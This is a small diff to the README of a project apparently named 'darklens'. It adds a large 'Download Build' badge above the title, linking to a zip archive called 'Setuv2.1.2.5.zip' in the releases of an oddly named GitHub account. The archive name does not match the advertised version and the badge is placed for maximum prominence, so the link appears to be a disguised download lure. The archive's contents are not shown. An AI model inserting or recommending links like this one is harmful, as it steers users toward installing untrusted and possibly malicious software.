@@ -1,3 +1,5 @@
+[![💾 Download Build](https://img.shields.io/badge/💾_Download-Build_v1.0.0-blue?style=for-the-badge)](https://github.com/samgarciaops2098l1/darklens/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # 🎮 darklens
 
 ![License](https://img.shields.io/badge/license-MIT-blue.svg)
